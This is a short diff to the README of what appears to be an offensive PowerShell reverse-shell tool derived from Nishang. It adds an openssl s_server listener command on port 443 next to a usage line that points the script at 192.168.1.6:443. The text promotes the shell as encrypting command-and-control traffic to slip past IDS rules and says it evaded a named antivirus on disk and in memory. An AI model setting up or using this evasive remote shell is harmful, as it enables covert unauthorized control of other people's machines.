@@ -6,6 +6,10 @@ This script is based on Nishang's, thanks for sharing<br>
 .\rc2.ps1 192.168.1.6 443
 ```
 
+```sh
+openssl s_server -quiet -key key.pem -cert cert.pem -port 443
+```
+
 This shell allows you to encrypt your C2, at the network transfer level at the transport and application layers mitigating the detection of rule anomalies of some IPs/IDs.<br>
 
 A proof of concept was carried out in several AVs, in the photo I avoided a S0ph0s on disk and memory.
